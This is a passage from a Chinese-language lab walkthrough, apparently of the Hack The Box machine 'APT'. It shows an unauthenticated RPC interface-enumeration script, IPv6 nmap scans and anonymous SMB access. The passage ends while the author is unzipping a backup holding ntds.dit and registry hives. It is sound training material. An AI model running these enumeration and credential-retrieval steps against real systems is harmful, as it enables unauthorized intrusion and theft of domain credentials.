+<p>发现方法名为 ServerAlive，尝试搜索关键词 <code>IObjectExporter ServerAlive</code>，发现了 stackflow 中给了一个链接 <a target="_blank" rel="noopener" href="https://github.com/EddieIvan01/win32api-practice/tree/master/oxid-nic-resolver">win32api-practice&#x2F;oxid-nic-resolver at master · EddieIvan01&#x2F;win32api-practice (github.com)</a></p>
+<p><img src="/pic/9f0207bc417450b9913e44bc18e1b1c5_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>根据链接跳转到下一个 GitHub 上的链接</p>
+<p><img src="/pic/d4a58635a4327f9be86d57d9bff6d649_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>结合描述，可能是一个地址解析的服务，通过 RPC 进行调用，尝试搜索该关键词 <code>OXID rpc</code>，在第二个链接 <a target="_blank" rel="noopener" href="https://www.cyber.airbus.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/">The OXID Resolver [Part 1] - Remote enumeration of network interfaces without any authentication - Airbus Defence and Space Cyber</a> 发现了利用的脚本</p>
+<p><img src="/pic/c1caf8017a9364efd2ba6bffff93bb06_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>是 python2 的语法，但是修改也比较简单，直接将 print 后面没有加的 <code>()</code> 加上即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><br><span class="hljs-keyword">import</span> sys, getopt<br><br><span class="hljs-keyword">from</span> impacket.dcerpc.v5 <span class="hljs-keyword">import</span> transport<br><span class="hljs-keyword">from</span> impacket.dcerpc.v5.rpcrt <span class="hljs-keyword">import</span> RPC_C_AUTHN_LEVEL_NONE<br><span class="hljs-keyword">from</span> impacket.dcerpc.v5.dcomrt <span class="hljs-keyword">import</span> IObjectExporter<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">argv</span>):<br><br>    <span class="hljs-keyword">try</span>:<br>        opts, args = getopt.getopt(argv,<span class="hljs-string">&quot;ht:&quot;</span>,[<span class="hljs-string">&quot;target=&quot;</span>])<br>    <span class="hljs-keyword">except</span> getopt.GetoptError:<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;IOXIDResolver.py -t &lt;target&gt;&#x27;</span>)<br>        sys.exit(<span class="hljs-number">2</span>)<br><br>    target_ip = <span class="hljs-string">&quot;192.168.1.1&quot;</span><br><br>    <span class="hljs-keyword">for</span> opt, arg <span class="hljs-keyword">in</span> opts:<br>        <span class="hljs-keyword">if</span> opt == <span class="hljs-string">&#x27;-h&#x27;</span>:<br>            <span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;IOXIDResolver.py -t &lt;target&gt;&#x27;</span>)<br>            sys.exit()<br>        <span class="hljs-keyword">elif</span> opt <span class="hljs-keyword">in</span> (<span class="hljs-string">&quot;-t&quot;</span>, <span class="hljs-string">&quot;--target&quot;</span>):<br>            target_ip = arg<br><br>    authLevel = RPC_C_AUTHN_LEVEL_NONE<br><br>    stringBinding = <span class="hljs-string">r&#x27;ncacn_ip_tcp:%s&#x27;</span> % target_ip<br>    rpctransport = transport.DCERPCTransportFactory(stringBinding)<br><br>    portmap = rpctransport.get_dce_rpc()<br>    portmap.set_auth_level(authLevel)<br>    portmap.connect()<br><br>    objExporter = IObjectExporter(portmap)<br>    bindings = objExporter.ServerAlive2()<br><br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;[*] Retrieving network interface of &quot;</span> + target_ip)<br><br>    <span class="hljs-comment">#NetworkAddr = bindings[0][&#x27;aNetworkAddr&#x27;]</span><br>    <span class="hljs-keyword">for</span> binding <span class="hljs-keyword">in</span> bindings:<br>        NetworkAddr = binding[<span class="hljs-string">&#x27;aNetworkAddr&#x27;</span>]<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;Address: &quot;</span> + NetworkAddr)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>   main(sys.argv[<span class="hljs-number">1</span>:])<br></code></pre></td></tr></table></figure>
+
+<p>尝试运行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿racknerd-4565a8)-[~/htb/apt]<br>└─$ python IOXIDResolver.py -t 10.10.10.213<br>[*] Retrieving network interface of 10.10.10.213<br>Address: apt<br>Address: 10.10.10.213<br>Address: dead:beef::15c<br>Address: dead:beef::b885:d62a:d679:573f<br>Address: dead:beef::e16a:d825:adec:9529<br></code></pre></td></tr></table></figure>
+
+<h2 id="IPV6-扫描"><a href="#IPV6-扫描" class="headerlink" title="IPV6 扫描"></a>IPV6 扫描</h2><p>成功，得到了两个 ipv6 地址，其中 <code>dead:beef</code> 是使用最广泛的占位符而已，没有实际意义。</p>
+<blockquote>
+<p>Amazingly, this also worked on the Windows 10 host – even though we were denied access with <strong>rpcmap.py</strong><br>推荐的第一篇 MSRPC 渗透的博客种提到了一个有意思的点，即使我们无法使用 rpcmap 来获取 endpoint 信息，但是如果 IObjectExporter(IOXIDResolver)是在目标上存在的，那么我们也可以使用上面的脚本来获得更多的 IP 信息</p>
+</blockquote>
+<p>既然有了新的 ip 地址目标，我们就要尝试对 ipv6 地址进行 nmap 扫描探测</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿racknerd-4565a8)-[~/htb/apt]<br>└─$ sudo nmap -6 --min-rate 10000 -p- dead:beef::b885:d62a:d679:573f<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-31 05:50 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> dead:beef::b885:d62a:d679:573f<br>Host is up (0.075s latency).<br>Not shown: 65513 filtered tcp ports (no-response)<br>PORT      STATE SERVICE<br>53/tcp    open  domain<br>80/tcp    open  http<br>88/tcp    open  kerberos-sec<br>135/tcp   open  msrpc<br>389/tcp   open  ldap<br>445/tcp   open  microsoft-ds<br>464/tcp   open  kpasswd5<br>593/tcp   open  http-rpc-epmap<br>636/tcp   open  ldapssl<br>3268/tcp  open  globalcatLDAP<br>3269/tcp  open  globalcatLDAPssl<br>5985/tcp  open  wsman<br>9389/tcp  open  adws<br>47001/tcp open  winrm<br>49664/tcp open  unknown<br>49665/tcp open  unknown<br>49666/tcp open  unknown<br>49667/tcp open  unknown<br>49669/tcp open  unknown<br>49670/tcp open  unknown<br>49675/tcp open  unknown<br>49698/tcp open  unknown<br></code></pre></td></tr></table></figure>
+
+<p>我还对另一个 IPV6 地址进行了探测，发现两者的扫描结果一致，那我们接下来只对第一个 ipv6 地址进行渗透。</p>
+<p>简单分析一下各端口号的服务</p>
+<ul>
+<li>53 是 DNS 服务端口。</li>
+<li>80 Web 端口。</li>
+<li>88端口通常用于 Kerberos 安全认证协议的服务（KDC 在此端口服务）。</li>
+<li>389端口是 LDAP 的标准端口，用于非安全（非加密）连接。636端口是LDAP的安全版本，通常用于进行加密的LDAP通信。</li>
+<li>464端口用于 Kerberos 密码更改 （Kerberos Password Change）服务，也称为 Kerberos 变更密码协议（Kerberos Change Password Protocol）。</li>
+<li>593 是 RPC 作为 web 服务时的端口。</li>
+<li>3269端口是用于对全局目录访问安全进行安全的 SSL&#x2F;TLS 连接的默认端口，是 3268 端口的安全版（全局目录是域林中的一种特殊类型的目录，包含了整个域林的所有对象的部分副本，而标准的 LDAP 目录则可能仅包含特定域或组织的信息）。</li>
+<li>5985 端口， 4986 端口，47001 端口都是 Windows Remote Management，可以称为 winrm，也可以称为 wsman，若部署了 Windows Remote Management 服务但未设置，那么就默认开放 470001 端口，如果设置完成则开放 5985 端口，加上安全套接层则开放 4986 端口。</li>
+<li>9389端口通常用于 Active Directory Web Services (ADWS) 服务。是一项基于 Web 服务的技术，它提供了通过标准的 Web 服务接口与 Active Directory 进行交互的功能。</li>
+<li>剩余的高端口是动态端口</li>
+</ul>
+<p>对端口服务进行扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿racknerd-4565a8)-[~/htb/apt]<br>└─$ sudo nmap -6 -sT -sV -sC -O -p53,80,88,135,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49669,49670,49675,49698 dead:beef::b885:d62a:d679:573f<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-31 06:02 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> dead:beef::b885:d62a:d679:573f<br>Host is up (0.075s latency).<br><br>PORT      STATE SERVICE      VERSION<br>53/tcp    open  domain?<br>80/tcp    open  http         Microsoft IIS httpd 10.0<br>|_http-title: Bad Request<br>| http-server-header:<br>|   Microsoft-HTTPAPI/2.0<br>|_  Microsoft-IIS/10.0<br>88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-10-31 02:02:38Z)<br>135/tcp   open  msrpc        Microsoft Windows RPC<br>389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)<br>|_ssl-<span class="hljs-built_in">date</span>: 2023-10-31T02:05:17+00:00; -7h59m52s from scanner time.<br>| ssl-cert: Subject: commonName=apt.htb.local<br>| Subject Alternative Name: DNS:apt.htb.local<br>| Not valid before: 2020-09-24T07:07:18<br>|_Not valid after:  2050-09-24T07:17:18<br>445/tcp   open  @            Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)<br>464/tcp   open  kpasswd5?<br>593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0<br>636/tcp   open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)<br>| ssl-cert: Subject: commonName=apt.htb.local<br>| Subject Alternative Name: DNS:apt.htb.local<br>| Not valid before: 2020-09-24T07:07:18<br>|_Not valid after:  2050-09-24T07:17:18<br>|_ssl-<span class="hljs-built_in">date</span>: 2023-10-31T02:05:16+00:00; -7h59m52s from scanner time.<br>3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)<br>|_ssl-<span class="hljs-built_in">date</span>: 2023-10-31T02:05:17+00:00; -7h59m52s from scanner time.<br>| ssl-cert: Subject: commonName=apt.htb.local<br>| Subject Alternative Name: DNS:apt.htb.local<br>| Not valid before: 2020-09-24T07:07:18<br>|_Not valid after:  2050-09-24T07:17:18<br>3269/tcp  open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)<br>|_ssl-<span class="hljs-built_in">date</span>: 2023-10-31T02:05:16+00:00; -7h59m52s from scanner time.<br>| ssl-cert: Subject: commonName=apt.htb.local<br>| Subject Alternative Name: DNS:apt.htb.local<br>| Not valid before: 2020-09-24T07:07:18<br>|_Not valid after:  2050-09-24T07:17:18<br>5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>|_http-title: Bad Request<br>9389/tcp  open  mc-nmf       .NET Message Framing<br>47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>|_http-title: Bad Request<br>49664/tcp open  msrpc        Microsoft Windows RPC<br>49665/tcp open  msrpc        Microsoft Windows RPC<br>49666/tcp open  msrpc        Microsoft Windows RPC<br>49667/tcp open  msrpc        Microsoft Windows RPC<br>49669/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0<br>49670/tcp open  msrpc        Microsoft Windows RPC<br>49675/tcp open  msrpc        Microsoft Windows RPC<br>49698/tcp open  msrpc        Microsoft Windows RPC<br>No OS matches <span class="hljs-keyword">for</span> host (If you know what OS is running on it, see https://nmap.org/submit/ ).<br>TCP/IP fingerprint:<br>OS:SCAN(V=7.94%E=6%D=10/31%OT=53%CT=%CU=%PV=N%DS=1%DC=D%G=Y%TM=6540D155%P=<br>OS:x86_64-pc-linux-gnu)S1(P=6000&#123;4&#125;28063fXX&#123;32&#125;0035912e625508a24c684c45a01<br>OS:22000bd8e000002040528010303080402080a0011ce2cff&#123;4&#125;%ST=0.019267%RT=0.096<br>OS:775)S2(P=6000&#123;4&#125;28063fXX&#123;32&#125;0035912f2cb44c9b4c684c46a0122000aed10000020<br>OS:40528010303080402080a0011ce8fff&#123;4&#125;%ST=0.11927%RT=0.193719)S3(P=6000&#123;4&#125;2<br>OS:8063fXX&#123;32&#125;003591305a6279a74c684c47a012200056b1000002040528010303080101<br>OS:080a0011cef4ff&#123;4&#125;%ST=0.219266%RT=0.293891)S4(P=6000&#123;4&#125;28063fXX&#123;32&#125;00359<br>OS:131b00a892d4c684c48a0122000ee1b000002040528010303080402080a0011cf58ff&#123;4<br>OS:&#125;%ST=0.319191%RT=0.394095)S5(P=6000&#123;4&#125;28063fXX&#123;32&#125;003591323dc5194c4c684<br>OS:c49a0122000cfdd000002040528010303080402080a0011cfbbff&#123;4&#125;%ST=0.419209%RT<br>OS:=0.493783)S6(P=6000&#123;4&#125;24063fXX&#123;32&#125;00359133be30065e4c684c4a9012200076080<br>OS:000020405280402080a0011d020ff&#123;4&#125;%ST=0.519251%RT=0.593973)IE1(P=6000&#123;4&#125;8<br>OS:03a3fXX&#123;32&#125;8100cad0abcd00&#123;122&#125;%ST=0.562513%RT=0.636932)TECN(P=602000&#123;3&#125;<br>OS:20063fXX&#123;32&#125;00359134dca3711d4c684c4b80522000cfc700000204052801030308010<br>OS:10402%ST=0.760972%RT=0.835817)EXTRA(FL=12345)<br><br>Network Distance: 1 hop<br>Service Info: Host: APT; OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>| smb2-security-mode:<br>|   3:1:1:<br>|_    Message signing enabled and required<br>| smb-os-discovery:<br>|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)<br>|   Computer name: apt<br>|   NetBIOS computer name: APT\x00<br>|   Domain name: htb.local<br>|   Forest name: htb.local<br>|   FQDN: apt.htb.local<br>|_  System time: 2023-10-31T02:05:02+00:00<br>| smb-security-mode:<br>|   account_used: guest<br>|   authentication_level: user<br>|   challenge_response: supported<br>|_  message_signing: required<br>| smb2-time:<br>|   <span class="hljs-built_in">date</span>: 2023-10-31T02:05:05<br>|_  start_date: 2023-10-31T01:45:51<br>|_clock-skew: mean: -7h59m51s, deviation: 0s, median: -7h59m52s<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 165.81 seconds<br></code></pre></td></tr></table></figure>
+
+<p>我们提取一下关键信息</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">389</span>端口暴露了apt.htb.<span class="hljs-keyword">local</span><br><span class="hljs-number">445</span>端口暴露了Windows <span class="hljs-keyword">Server</span> <span class="hljs-number">2016</span> Standard<br>计算机名apt，域名htb.<span class="hljs-keyword">local</span><br></code></pre></td></tr></table></figure>
+
+<p>这样我们就彻底确认了这是一台域控，同时我们需要把 <code>htb.local</code> 和 IPV6 地址建立起映射</p>
+<p><img src="/pic/17b56965079f20161b94e6a6f9830507_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>访问发现和之前 ipv4 地址的界面是一样的，联想起当时看网页源码时，里面提到了那个网站是由镜像工具生成的</p>
+<h2 id="smb-渗透"><a href="#smb-渗透" class="headerlink" title="smb 渗透"></a>smb 渗透</h2><p>我们优先对低摘的果子进行渗透，这里开启了 smb 共享，我们先尝试查看有哪些共享目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿racknerd-4565a8)-[~/htb/apt]<br>└─$ sudo smbclient -L //htb.local<br>[sudo] password <span class="hljs-keyword">for</span> i3eg1nner:<br>Password <span class="hljs-keyword">for</span> [WORKGROUP\root]:<br>Anonymous login successful<br><br>        Sharename       Type      Comment<br>        ---------       ----      -------<br>        backup          Disk<br>        IPC$            IPC       Remote IPC<br>        NETLOGON        Disk      Logon server share<br>        SYSVOL          Disk      Logon server share<br>htb.local is an IPv6 address -- no workgroup available<br></code></pre></td></tr></table></figure>
+
+<p>我们先尝试访问 backup 目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿racknerd-4565a8)-[~/htb/apt]<br>└─$ sudo smbclient //htb.local/backup<br>Password <span class="hljs-keyword">for</span> [WORKGROUP\root]:<br>Anonymous login successful<br>Try <span class="hljs-string">&quot;help&quot;</span> to get a list of possible commands.<br>smb: \&gt; <span class="hljs-built_in">ls</span><br>  .                                   D        0  Thu Sep 24 03:30:52 2020<br>  ..                                  D        0  Thu Sep 24 03:30:52 2020<br>  backup.zip                          A 10650961  Thu Sep 24 03:30:32 2020<br><br>                5114623 blocks of size 4096. 2632388 blocks available<br>smb: \&gt; get backup.zip<br>getting file \backup.zip of size 10650961 as backup.zip (2632.6 KiloBytes/sec) (average 2632.6 KiloBytes/sec)<br>smb: \&gt; <span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure>
+
+<p>这里可以顺便把剩余几个目录也尝试访问一下，虽然有东西的概率较小。</p>
+<p>查看 <code>backup.zip</code> 文件</p>
+<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">┌──<span class="hljs-punctuation">(</span><span class="hljs-variable">i3eg1nner</span>㉿<span class="hljs-variable">racknerd</span><span class="hljs-operator">-</span><span class="hljs-number">4565</span><span class="hljs-variable">a8</span><span class="hljs-punctuation">)</span><span class="hljs-operator">-</span><span class="hljs-punctuation">[</span><span class="hljs-operator">~/</span><span class="hljs-variable">htb</span><span class="hljs-operator">/</span><span class="hljs-variable">apt</span><span class="hljs-punctuation">]</span><br>└─<span class="hljs-variable">$</span> <span class="hljs-variable">file</span> <span class="hljs-variable">backup</span><span class="hljs-operator">.</span><span class="hljs-variable">zip</span><br><span class="hljs-variable">backup</span><span class="hljs-operator">.</span><span class="hljs-variable">zip</span><span class="hljs-operator">:</span> <span class="hljs-variable">Zip</span> <span class="hljs-variable">archive</span> <span class="hljs-variable">data</span><span class="hljs-operator">,</span> <span class="hljs-variable">at</span> <span class="hljs-variable">least</span> <span class="hljs-variable">v2</span><span class="hljs-number">.0</span> <span class="hljs-variable">to</span> <span class="hljs-variable">extract</span><span class="hljs-operator">,</span> <span class="hljs-variable">compression</span> <span class="hljs-variable">method</span><span class="hljs-operator">=</span><span class="hljs-variable">store</span><br>┌──<span class="hljs-punctuation">(</span><span class="hljs-variable">i3eg1nner</span>㉿<span class="hljs-variable">racknerd</span><span class="hljs-operator">-</span><span class="hljs-number">4565</span><span class="hljs-variable">a8</span><span class="hljs-punctuation">)</span><span class="hljs-operator">-</span><span class="hljs-punctuation">[</span><span class="hljs-operator">~/</span><span class="hljs-variable">htb</span><span class="hljs-operator">/</span><span class="hljs-variable">apt</span><span class="hljs-punctuation">]</span><br>└─<span class="hljs-variable">$</span> <span class="hljs-variable">unzip</span> <span class="hljs-operator">-</span><span class="hljs-variable">l</span> <span class="hljs-variable">backup</span><span class="hljs-operator">.</span><span class="hljs-variable">zip</span><br><span class="hljs-variable">Archive</span><span class="hljs-operator">:</span>  <span class="hljs-variable">backup</span><span class="hljs-operator">.</span><span class="hljs-variable">zip</span><br>  <span class="hljs-built_in">Length</span>      <span class="hljs-built_in">Date</span>    <span class="hljs-variable">Time</span>    <span class="hljs-variable">Name</span><br><span class="hljs-operator">---------</span>  <span class="hljs-operator">----------</span> <span class="hljs-operator">-----</span>   <span class="hljs-operator">----</span><br>        <span class="hljs-number">0</span>  <span class="hljs-number">2020</span><span class="hljs-operator">-</span><span class="hljs-number">09</span><span class="hljs-operator">-</span><span class="hljs-number">23</span> <span class="hljs-number">19</span><span class="hljs-operator">:</span><span class="hljs-number">40</span>   <span class="hljs-built_in">Active</span> <span class="hljs-built_in">Directory</span><span class="hljs-operator">/</span><br> <span class="hljs-number">50331648</span>  <span class="hljs-number">2020</span><span class="hljs-operator">-</span><span class="hljs-number">09</span><span class="hljs-operator">-</span><span class="hljs-number">23</span> <span class="hljs-number">19</span><span class="hljs-operator">:</span><span class="hljs-number">38</span>   <span class="hljs-built_in">Active</span> <span class="hljs-built_in">Directory</span><span class="hljs-operator">/</span><span class="hljs-variable">ntds</span><span class="hljs-operator">.</span><span class="hljs-variable">dit</span><br>    <span class="hljs-number">16384</span>  <span class="hljs-number">2020</span><span class="hljs-operator">-</span><span class="hljs-number">09</span><span class="hljs-operator">-</span><span class="hljs-number">23</span> <span class="hljs-number">19</span><span class="hljs-operator">:</span><span class="hljs-number">38</span>   <span class="hljs-built_in">Active</span> <span class="hljs-built_in">Directory</span><span class="hljs-operator">/</span><span class="hljs-variable">ntds</span><span class="hljs-operator">.</span><span class="hljs-variable">jfm</span><br>        <span class="hljs-number">0</span>  <span class="hljs-number">2020</span><span class="hljs-operator">-</span><span class="hljs-number">09</span><span class="hljs-operator">-</span><span class="hljs-number">23</span> <span class="hljs-number">19</span><span class="hljs-operator">:</span><span class="hljs-number">40</span>   <span class="hljs-variable">registry</span><span class="hljs-operator">/</span><br>   <span class="hljs-number">262144</span>  <span class="hljs-number">2020</span><span class="hljs-operator">-</span><span class="hljs-number">09</span><span class="hljs-operator">-</span><span class="hljs-number">23</span> <span class="hljs-number">19</span><span class="hljs-operator">:</span><span class="hljs-number">22</span>   <span class="hljs-variable">registry</span><span class="hljs-operator">/</span><span class="hljs-variable">SECURITY</span><br> <span class="hljs-number">12582912</span>  <span class="hljs-number">2020</span><span class="hljs-operator">-</span><span class="hljs-number">09</span><span class="hljs-operator">-</span><span class="hljs-number">23</span> <span class="hljs-number">19</span><span class="hljs-operator">:</span><span class="hljs-number">22</span>   <span class="hljs-variable">registry</span><span class="hljs-operator">/</span><span class="hljs-variable">SYSTEM</span><br><span class="hljs-operator">---------</span>                     <span class="hljs-operator">-------</span><br> <span class="hljs-number">63193088</span>                     <span class="hljs-number">6</span> <span class="hljs-variable">files</span><br><br>┌──<span class="hljs-punctuation">(</span><span class="hljs-variable">i3eg1nner</span>㉿<span class="hljs-variable">racknerd</span><span class="hljs-operator">-</span><span class="hljs-number">4565</span><span class="hljs-variable">a8</span><span class="hljs-punctuation">)</span><span class="hljs-operator">-</span><span class="hljs-punctuation">[</span><span class="hljs-operator">~/</span><span class="hljs-variable">htb</span><span class="hljs-operator">/</span><span class="hljs-variable">apt</span><span class="hljs-punctuation">]</span><br>└─<span class="hljs-variable">$</span> <span class="hljs-variable">unzip</span> <span class="hljs-variable">backup</span><span class="hljs-operator">.</span><span class="hljs-variable">zip</span><br><span class="hljs-variable">Archive</span><span class="hljs-operator">:</span>  <span class="hljs-variable">backup</span><span class="hljs-operator">.</span><span class="hljs-variable">zip</span><br>   <span class="hljs-variable">creating</span><span class="hljs-operator">:</span> <span class="hljs-built_in">Active</span> <span class="hljs-built_in">Directory</span><span class="hljs-operator">/</span><br><span class="hljs-punctuation">[</span><span class="hljs-variable">backup</span><span class="hljs-operator">.</span><span class="hljs-variable">zip</span><span class="hljs-punctuation">]</span> <span class="hljs-built_in">Active</span> <span class="hljs-built_in">Directory</span><span class="hljs-operator">/</span><span class="hljs-variable">ntds</span><span class="hljs-operator">.</span><span class="hljs-variable">dit</span> <span class="hljs-variable">password</span><span class="hljs-operator">:</span><br>   <span class="hljs-variable">skipping</span><span class="hljs-operator">:</span> <span class="hljs-built_in">Active</span> <span class="hljs-built_in">Directory</span><span class="hljs-operator">/</span><span class="hljs-variable">ntds</span><span class="hljs-operator">.</span><span class="hljs-variable">dit</span>  <span class="hljs-variable">incorrect</span> <span class="hljs-variable">password</span><br>   <span class="hljs-variable">skipping</span><span class="hljs-operator">:</span> <span class="hljs-built_in">Active</span> <span class="hljs-built_in">Directory</span><span class="hljs-operator">/</span><span class="hljs-variable">ntds</span><span class="hljs-operator">.</span><span class="hljs-variable">jfm</span>  <span class="hljs-variable">incorrect</span> <span class="hljs-variable">password</span><br>   <span class="hljs-variable">creating</span><span class="hljs-operator">:</span> <span class="hljs-variable">registry</span><span class="hljs-operator">/</span><br>   <span class="hljs-variable">skipping</span><span class="hljs-operator">:</span> <span 